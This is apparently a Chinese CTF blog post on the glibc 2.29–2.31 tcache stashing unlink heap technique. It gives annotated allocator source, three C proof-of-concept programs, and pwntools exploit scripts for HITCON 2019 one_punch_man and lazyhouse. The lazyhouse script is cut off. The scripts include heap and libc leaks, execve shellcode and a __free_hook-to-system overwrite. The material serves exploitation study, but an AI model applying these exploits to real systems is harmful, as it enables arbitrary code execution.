---
title: Tcache Stashing Unlink Attack
date: 2020-05-05 19:03:01
tags: [ctf, pwn]
---

自 glibc-2.29 后 Unsortedbin Attack 已经不再适用，在 Tcache 机制上又出现了一种新的技术。

<!-- more -->

> 本文基于 glibc-2.31（Ubuntu 20.04）。

# Structure & Functions

主要根据源码来分析一下。首先，相比之前 2.27 的 tcache，现在的 tcache_entry 结构体新增了一个 key 字段；且 tcache_perthread_struct 中的 counts 字段从 uint8_t 变成了 uint16_t：

```cpp
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

然后在 free 的时候新增了一段对 tcache 的 Double Free 的检测代码，先是检测 key 值是否等于 tcache，然后会遍历 tcache 来判断有没有重复 free：

```cpp
    /* This test succeeds on double free.  However, we don't 100%
       trust it (it also matches random payload data at a 1 in
       2^<size_t> chance), so verify it's not an unlikely
       coincidence before aborting.  */
    if (__glibc_unlikely (e->key == tcache))
      {
        tcache_entry *tmp;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
         tmp;
         tmp = tmp->next)
          if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
        /* If we get here, it was a coincidence.  We've wasted a
           few cycles, but don't abort.  */
      }
```

在 tcache_put 中也新增了对 key 字段的存储，用于后面对 Double Free 的检查：

```cpp
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满：

```cpp
#if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb);
          if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
             && (tc_victim = *fb) != NULL)
            {
              if (SINGLE_THREAD_P)
            *fb = tc_victim->fd;
              else
            {
              REMOVE_FB (fb, pp, tc_victim);
              if (__glibc_unlikely (tc_victim == NULL))
                break;
            }
              tcache_put (tc_victim, tc_idx);
            }
        }
#endif
```

然后是 Smallbins 解链的部分这里，根据大小确定 idx 并找到 Smallbins 对应的地址 bin。然后将 victim 设置为 bin 的 bk 所指向的 Chunk（根据 FIFO，即为最先放入的 Chunk），并判断 victim 的 bk 的 fd（bck 的 fd）是否指回 victim，即是否构成双向链表。接下来设置 victim 的 prev_inuse 位，并将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出：

```cpp
   /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
      if (__glibc_unlikely (bck->fd != victim))
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;
```

接下来是 Smallbins 后面对 tcache 的使用。和前面一样先是定位到对应 tcache 的 idx，然后判断 tcache 中的 Chunk 数量以及第一个 tc_victim 是否和 bin 构成双向链表。并且和 Fastbins 一样，把 Smallbins 中剩下的 Chunk 放进对应的 tcache 中：

```cpp
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
             && (tc_victim = last (bin)) != bin)
        {
          if (tc_victim != 0)
            {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;

              tcache_put (tc_victim, tc_idx);
                }
        }
```

# Vulnerabilities

## Tcache Stashing Unlink Attack

根据前面分析的部分，`bck->fd = bin;` 这句代码可以达到和 Unsortedbin Attack 类似的效果，可以将一个 main_arena 中的地址（bin）写入指定位置（bck->fd）。这种 Smallbins 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。操作大概如下：

1. 先放入 2 个 Chunk 到 Smallbins，6 个 Chunk 到对应的 tcache；
2. 然后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10。这样当再向 Smallbins 申请对应大小的 Chunk 时（使用 calloc 就不会请求 tcache），先放入 Smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。`bck = tc_victim->bk;` 此时的 bck 就是目标地址减 0x10，之后 `bck->fd = bin;` 也就是将目标地址上的值赋为 bin，这样就实现了等价于 Unsortedbin Attack 的操作；
3. 之后调用 tcache_put 把后放入 Smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t victim = 0;

int main() {
    int i;
    void *p, *q, *padding;

    fprintf(stderr, "You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n");
    fprintf(stderr, "\n1. need to know heap address and the victim address that you need to attack\n");
    p = malloc(0x18);
    fprintf(stderr, "[+] victim's address => %p, victim's vaule => 0x%lx\n", &victim, victim);
    fprintf(stderr, "[+] heap address => %p\n", (uint64_t)p - 0x260);

    fprintf(stderr, "\n2. choose a stable size and free six identical size chunks to tcache_entry list\n");       fprintf(stderr, "Here, I choose 0x60\n");
    for (i = 0; i < 6; i++) {
        p = calloc(1, 0x58);
        free(p);
    }
    fprintf(stderr, "Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p\n",
        p, (uint64_t)p - 0x60, (uint64_t)p - 0x60 * 2, (uint64_t)p - 0x60 * 3, (uint64_t)p - 0x60 * 4, (uint64_t)p - 0x60 * 5);
    fprintf(stderr, "\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
    p = malloc(0x428);
    fprintf(stderr, "Alloc a chunk %p, whose size is beyond tcache size threshold\n", p);
    padding = malloc(0x28);
    fprintf(stderr, "Alloc a padding chunk, avoid %p to merge to top chunk\n", p);
    free(p);
    fprintf(stderr, "Free chunk %p to unsortedbin\n", p);
    malloc(0x428 - 0x60);
    fprintf(stderr, "Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x108);
    fprintf(stderr, "Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)p + 0x3c0);

    fprintf(stderr, "Repeat the above steps, and free another chunk into corresponding smallbin\n");
    fprintf(stderr, "A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    q = malloc(0x428);
    padding = malloc(0x88);
    free(q);
    malloc(0x3c8);
    malloc(0x108);
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)q + 0x3c0);
    fprintf(stderr, "smallbin[4] list is %p <--> %p\n", (uint64_t)p + 0x3c0, (uint64_t)q + 0x3c0);

    fprintf(stderr, "\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
    fprintf(stderr, "Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", (uint64_t)q + 0x3c0, (uint64_t)(&victim) - 0x10);
    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&victim) - 0x10;

    printf("\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
    calloc(1, 0x58);
    printf("Finally, the victim's value is changed to a big number\n");
    printf("Now, victim's value => 0x%lx\n", victim);
    return 0;
}
```

## Tcache Stashing Unlink Attack Plus

可以实现任意地址的分配，和上述布局大致相同，不过有细微差异。操作大概如下：

1. 放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache，后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；
2. 在 stash 机制时，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin->bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 Smallbins 中。之后不满足终止条件，会进行下一次的 stash，这时的 tc_victim 就是目标地址；
3. 接下来执行 `bck = tc_victim->bk; bck->fd = bin;`，将目标地址加 0x8 处的指针。最后目标地址就会被放入 tcache_entry 的头部，stash 满足终止条件而终止。

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static uint64_t victim[4] = {0, 0, 0, 0};

int main() {
    int i;
    void *p, *q, *r, *padding;

    fprintf(stderr, "You can use this technique to get a tcache chunk to arbitrary address\n");
    fprintf(stderr, "\n1. need to know heap address and the victim address that you need to attack\n");
    p = malloc(0x18);
    fprintf(stderr, "[+] victim's address => %p, victim's vaule => [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        &victim, victim[0], victim[1], victim[2], victim[3]);
    fprintf(stderr, "[+] heap address => %p\n", (uint64_t)p - 0x260);

    fprintf(stderr, "\n2. change victim's data, make victim[1] = &victim, or other address to writable address\n");
    victim[1] = (uint64_t)(&victim);
    fprintf(stderr, "victim's vaule => [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        victim[0], victim[1], victim[2], victim[3]);

    fprintf(stderr, "\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
    fprintf(stderr, "Here, I choose the size 0x60\n");
    for (i = 0; i < 5; i++){
        r = calloc(1, 0x58);
        free(r);
    }
    fprintf(stderr, "Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p\n",
        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);

    fprintf(stderr, "\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
    p = malloc(0x428);
    fprintf(stderr, "Alloc a chunk %p, whose size is beyond tcache size threshold\n", p);
    padding = malloc(0x28);
    fprintf(stderr, "Alloc a padding chunk, avoid %p to merge to top chunk\n", p);
    free(p);
    fprintf(stderr, "Free chunk %p to unsortedbin\n", p);
    malloc(0x3c8);
    fprintf(stderr, "Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x108);
    fprintf(stderr, "Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)p + 0x3c0);

    fprintf(stderr, "Repeat the above steps, and free another chunk into corresponding smallbin\n");
    fprintf(stderr, "A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    q = malloc(0x428);
    padding = malloc(0x88);
    free(q);
    malloc(0x3c8);
    malloc(0x108);
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)q + 0x3c0);
    fprintf(stderr, "smallbin[4] list is %p <--> %p\n", (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);

    fprintf(stderr, "\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
    fprintf(stderr, "Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", (uint64_t)q + 0x3c0, (uint64_t)(&victim) - 0x10);
    *(uint64_t *)(q + 0x3c0 + 0x18) = (uint64_t)(&victim) - 0x10;

    fprintf(stderr, "\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
    calloc(1, 0x58);
    fprintf(stderr, "Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n",
        &victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);
    printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");
    p = malloc(0x58);
    *(uint64_t *)((uint64_t)p) = 0xaa;
    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;
    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;
    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;
    printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        victim[0], victim[1], victim[2], victim[3]);
    return 0;
}
```

## Tcache Stashing Unlink Attack Plus Plus

同时实现上面的两种功能。操作大概如下：

1. 将 Smallbins 里的 bk 设置为目标地址 1 减 0x10，将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。这样就可以将 tcache 分配到目标地址 1，同时向目标地址 2 写入一个大数字。

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

uint64_t victim[4] = {0, 0, 0, 0};
uint64_t target = 0;

int main() {
    int i;
    void *p, *q, *r, *padding;

    fprintf(stderr, "You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n");

    fprintf(stderr, "\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n");
    p = malloc(0x18);
    fprintf(stderr, "[+] victim's address => %p, victim's vaule => [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        &victim, victim[0], victim[1], victim[2], victim[3]);
    fprintf(stderr, "[+] target's address => %p, target's value => 0x%lx\n",
        &target, target);
    fprintf(stderr, "[+] heap address => %p\n", (uint64_t)p - 0x260);

    fprintf(stderr, "\n2. change victim's data, make victim[1] = &target-0x10\n");
    victim[1] = (uint64_t)(&target) - 0x10;
    fprintf(stderr, "victim's vaule => [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        victim[0], victim[1], victim[2], victim[3]);

    fprintf(stderr, "\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
    fprintf(stderr, "Here, I choose 0x60\n");
    for (i = 0; i < 5; i++) {
        r = calloc(1, 0x58);
        free(r);
    }
    fprintf(stderr, "Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p\n",
        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);

    fprintf(stderr, "\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
    p = malloc(0x428);
    fprintf(stderr, "Alloc a chunk %p, whose size is beyond tcache size threshold\n", p);
    padding = malloc(0x28);
    fprintf(stderr, "Alloc a padding chunk, avoid %p to merge to top chunk\n", p);
    free(p);
    fprintf(stderr, "Free chunk %p to unsortedbin\n", p);
    malloc(0x3c8);
    fprintf(stderr, "Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x108);
    fprintf(stderr, "Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)p + 0x3c0);

    fprintf(stderr, "Repeat the above steps, and free another chunk into corresponding smallbin\n");
    fprintf(stderr, "A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    q = malloc(0x428);
    padding = malloc(0x88);
    free(q);
    malloc(0x3c8);
    malloc(0x108);
    fprintf(stderr, "chunk %p is in smallbin[4], whose size is 0x60\n", (uint64_t)q + 0x3c0);
    fprintf(stderr, "smallbin[4] list is %p <--> %p\n", (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);

    fprintf(stderr, "\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
    fprintf(stderr, "Change %p's bk pointer to &victim-0x10 address => 0x%lx\n", (uint64_t)q + 0x3c0, (uint64_t)(&victim) - 0x10);
    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&victim) - 0x10;

    fprintf(stderr, "\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
    calloc(1, 0x58);
    fprintf(stderr, "Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n",
        &victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);
    fprintf(stderr, "Apply to tcache_entry[4], you can get a pointer to victim address\n");
    p = malloc(0x58);
    *(uint64_t *)((uint64_t)p) = 0xaa;
    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;
    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;
    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;
    fprintf(stderr, "victim's vaule => [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n",
        victim[0], victim[1], victim[2], victim[3]);
    fprintf(stderr, "target's value => 0x%lx\n", target);
    return 0;
}
```

## Condition

总结一下，可以进行利用的最基本条件如下：

1. 可以获得堆的地址；
2. 可以修改 Smallbins 中 Chunk 的 bk 字段。

# Exploitation

记录一些漏洞相关的题目。在参考网站中记录了很多讲得很好的博客，这里对题目等的描述就直接略过了。

> 在实际做题过程中发现 glibc-2.29 和 glibc-2.31 下的题目 IDA 不能很好地反编译 switch 语句，比较推荐用 Ghidra 或是 Cutter。

## 2019-HITCON-one_punch_man（tcache stashing unlink attack）

> 环境：Ubuntu 20.04（VMware Fusion）
> 原本程序加了 seccomp filter，因为主要是复现新技术，就将对应的代码 patch 掉了；同时题目中的隐藏函数只有在 tache 0x220 对应的 count 大于 6 时才能调用，但因为用的是 glibc-2.31 的环境，count 字段从 1 个字节变为了 2 个字节，偏移就对不上了，所以这里也把对应的 if 语句 patch 掉了。

在 debut 时发现不能用 fastbins，而且调用的是 calloc（不从 tcache 拿），然后在隐藏函数中调用 malloc，如果我们在 tcache 中布置好对应的 Chunk，就能用 malloc 取到对应的 Chunk：

```cpp
unsigned __int64 __fastcall debut(__int64 a1, __int64 a2)
{
  unsigned int idx; // [rsp+8h] [rbp-418h]
  signed int len; // [rsp+Ch] [rbp-414h]
  char s[1032]; // [rsp+10h] [rbp-410h]
  unsigned __int64 v6; // [rsp+418h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  write_buf("idx: ");
  idx = read_int();
  if ( idx > 2 )
    error((__int64)"invalid");
  write_buf("hero name: ");
  memset(s, 0, 0x400uLL);
  len = read(0, s, 0x400uLL);
  if ( len <= 0 )
    error((__int64)"io");
  s[len - 1] = 0;
  if ( len <= 0x7F || len > 0x400 )
    error((__int64)"poor hero name");
  *((_QWORD *)&unk_4040 + 2 * idx) = calloc(1uLL, len);
  qword_4048[2 * idx] = len;
  strncpy(*((char **)&unk_4040 + 2 * idx), s, len);
  memset(s, 0, 0x400uLL);
  return __readfsqword(0x28u) ^ v6;
}

__int64 __fastcall punch(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  void *buf; // [rsp+8h] [rbp-8h]

  v2 = *(unsigned __int8 *)(qword_4030 + 0x20);
  buf = malloc(0x217uLL);
  if ( !buf )
    error((__int64)"err");
  if ( read(0, buf, 0x217uLL) <= 0 )
    error((__int64)"io");
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```

free 的时候存在 Use After Free：

```cpp
void __fastcall retire(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  write_buf("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error((__int64)"invalid");
  free(*((void **)&unk_4040 + 2 * v2));
}
```

依次泄漏 heap 和 libc，然后构造用于 tcache stashing unlink attack 的两个 smallbins，最后就可以直接改 free_hook 为 system（因为我已经把 seccomp filter 给 patch 了）。Exploit：

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./one_punch')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
    p.recvuntil('> ')
    p.sendline(str(c))

def new(idx, name):
    cmd(1)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('hero name: ')
    p.send(name)
    sleep(0.1)

def edit(idx, name):
    cmd(2)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('hero name: ')
    p.send(name)
    sleep(0.1)

def show(idx):
    cmd(3)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def free(idx):
    cmd(4)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def leave():
    cmd(5)

def punch(data):
    cmd(0xC388)
    p.send(data)
    sleep(0.1)

for i in range(5):
    new(0, str(i) * 0xf8)
    free(0) # fillup tcache 0x100
new(0, '0' * 0x408)
new(1, '1' * 0x408)
free(0)
free(1)
show(1) # leak heap
p.recvuntil('hero name: ')
heap_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x7a0
info('heap_base = ' + hex(heap_base))
#gdb.attach(p)

for i in range(5):
    new(0, str(i) * 0x408)
    free(0) # fillup tcache 0x410
new(0, '0' * 0x408)
sh = asm('''
    xor rax, rax
    mov al, 59
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    syscall
''')
info('sh => ' + repr(sh))
new(1, sh.ljust(0x408, b'\x90'))
shellcode_addr = heap_base + 0x2820
info('shellcode_addr = ' + hex(shellcode_addr))
free(0)
show(0) # leak libc
p.recvuntil('hero name: ')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))
#gdb.attach(p)

for i in range(3):
    new(1, '1' * 0x408)
    new(2, '2' * 0x408) # prevent from consolidate
    free(1) # put into unsorted bin
    new(2, '2' * 0x308) # stash remainder(0x100) into small bins
new(0, '0' * 0x217) # set up tcache 0x217 before unlink
free(0) # put into tcache 0x220
payload = b'\x00' * 0x308 + p64(0x101) + p64(heap_base + 0x3340) + p64(heap_base + 0x40)
#payload = p64(0xdeadbeef)
edit(1, payload) # overwrite smallbins' bk
new(1, '1' * 0xf8) # unlink
#gdb.attach(p)

free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
edit(0, p64(free_hook_addr).ljust(0x217, b'\x00')) # change tcache 0x220's fd => __free_hook
punch('punch') # get a chunk from tcache 0x220
punch(p64(system_addr)) # get __free_hook from tcache 0x220
new(2, b'/bin/sh\x00'.ljust(0x408, b'\x00'))
free(2)
p.interactive()
```

## 2019-HITCON-lazyhouse（tcache stashing unlink attack plus）

> 环境：Ubuntu 19.04（Docker）
> 源程序也有 seccomp filter，这里 patch 了
> 使用 IDA 反编译时不能正常显示 switch 语句，具体修改参考[这篇文章](https://www.bilibili.com/read/cv5150631/)。

这道题目非常精彩，结合了很多技术，[keenan 的博客](http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/)里解释的很详细。因为其中会涉及在 tcache_pthread_struct 上伪造 Chunk，而 glibc-2.31 中的 count 字段从 1 个字节变为了 2 个字节，所以在 20.04 上暂时没想到利用方法，这里就在 19.04 上复现了一遍。buy 的时候可以看到同样不能用 fastbins，而且会比较钱的大小（money 初始化为 0x1c796），这里存在一个乘法溢出。且使用 calloc：

```cpp
    if ( size > 0x7F )
    {
      if ( 0xDA * size <= money )
      {
        memset(&s, 0, 0x100uLL);
        snprintf(&s, 0x100uLL, "Price:%lu", money);
        writeline_buf(&s);
        qword_5060[3 * v1 + 2] = size << 6;
        qword_5060[3 * v1 + 1] = size;
        money -= 0xDA * size;
        buf = calloc(1uLL, size);
        if ( buf )
        {
          write_buf("House:");
          read_buf((__int64)buf, size);
          qword_5060[3 * v1] = buf;
        }
```

upgrade 中可以多写 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk，buy_super 是隐藏函数，调用 malloc：

```cpp
void *upgrade()
{
  __int64 v0; // ST08_8
  void *result; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-10h]

  if ( unk_5018 <= 0 )
    return (void *)writeline_buf("You cannot upgrade again !");
  write_buf("Index:");
  v2 = read_long();
  if ( v2 > 7 || !qword_5060[3 * v2] )
    return (void *)writeline_buf("Invalid !");
  v0 = qword_5060[3 * v2 + 1];
  write_buf("House:");
  read_buf(qword_5060[3 * v2], v0 + 0x20);
  qword_5060[3 * v2 + 2] = 218 * v0;
  result = &unk_5018;
  --unk_5018;
  return result;
}

unsigned __int64 buy_super()
{
  char s; // [rsp+0h] [rbp-310h]
  unsigned __int64 v2; // [rsp+308h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( qword_5040[0] )
  {
    writeline_buf("Lays already has a super house!");
  }
  else
  {
    if ( money <= 0x216FFFFFuLL )
    {
      writeline_buf("You don't have enough money to buy the luxury house");
      _exit(535);
    }
    money -= 0x21700000LL;
    memset(&s, 0, 0x300uLL);
    write_buf("House:");
    read_buf((__int64)&s, 0x217u);
    qword_5040[0] = malloc(0x217uLL);
    memset((void *)qword_5040[0], 0, 0x217uLL);
    strncpy((char *)qword_5040[0], &s, 0x217uLL);
    qword_5040[2] = (const void *)0x21700000;
    qword_5040[1] = &off_210 + 7;
    writeline_buf("Done!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

一开始通过乘法溢出来改 money 的大小，然后利用 largebins 同时泄漏 heap 和 libc。然后通过 unlink 构造 overlapping，最后构造好 smallbins 的 bk，依次取构造好的 Chunk。Exploit：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./lazyhouse')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
    p.recvuntil('choice: ')
    p.sendline(str(c))

def new(idx, sz, content):
    cmd(1)
    p.recvuntil('Your money:')
    money = int(p.recvuntil('\n', drop=True))
    info('money = ' + hex(money))
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.sendline(str(sz))
    if sz < pow(2, 32):
        p.recvuntil('House:')
        p.send(content)
        sleep(0.1)

def show(idx):
    cmd(2)
    p.recvuntil('Index:')
    p.sendline(str(idx))

def free(idx):
    cmd(3)
    p.recvuntil('Index:')
    p.sendline(str(idx))

def edit(idx, content):
    cmd(4)
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('House:')
    p.send(content)
    sleep(0.1)

def secret(content):
    cmd(5)
    p.recvuntil('House:')
    p.send(content)
    sleep(0.1)

size = int((pow(2, 64) - 1) // 0xDA) + 1
info('size = ' + hex(size))
new(0, size, '0') # bypass
free(0)
new(0, 0x88, '0')
new(1, 0x508, '1') # put into largebins later for leak
new(2, 0x88, '2')
free(1)
new(1, 0x608, '1') # trigger consolidate ; put 0x508 into largebins
edit(0, '\x00' * 0x88 + p64(0x513)) # set IS_MMAPED
new(7, 0x508, '7')
show(7)
leak_data = p.recvn(0x500)
libc_base = u64(leak_data[0x8:0x10]) - 0x1e50d0
info('libc_base = ' + hex(libc_base))
heap_base = u64(leak_data[0x10:0x18]) - 0x2e0
info('heap_base = ' + hex(heap_base))
#gdb.attach(p)

free(0)
free(1)
free(2)
size = 0x90 * 4 - 0x10
target = heap_base + 0x890
payload = p64(0) + p64(size | 1) + p64(target + 0x20 - 0x18) + p64(target + 0x20 - 0x10) + p64(target)
new(6, 0x88, payload) # create fake chunk for unlink
new(5, 0x88, '5')
new(0, 0x88, '0')
new(1, 0x88, '1')
new(2, 0x608, '\x00' * 0x508 + p64(0x101))
edit(1, '\x00' * 0x80 + p64(size) + p64(0x610)) # overwrite prev_size & size (PREV_INUSE)
free(2) # unlink
payload = (
    '\x00' * 0x78 + p64(0x6c1) + # 5
    '\x00' * 0x88 + p64(0x31) + # 0
    '\x00' * 0x88 + p64(0x21) # 1
)
new(2, 0x508, payload) # merge into top chunk
free(0)
free(1)
free(2)
#gdb.attach(p)

new(0, 0x1a8, '\x00' * 0x78 + p64(0x6c1))
new(1, 0x218, '1')
new(2, 0x218, '2')
free(2)
new(2, 0x218, '\x00' * 0x148 + p64(0xd1)) # create fake chunk ; bypass check
free(2)
for i in range(5):
    new(2, 0x218, '2')
    free(2) # fillup tcache 0x220
new(2, 0x3a8, '2')
free(2) # create fake size in tcache_pthread_struct
#raw_input('@')
free(1)
new(1, 0x228, '1') # trigger consolidate ; put into smallbins 0x100
free(5)
#raw_input('@')
smallbins_addr = libc_base + 0x1e4eb0
tcache_fake_chunk_addr = heap_base + 0x40
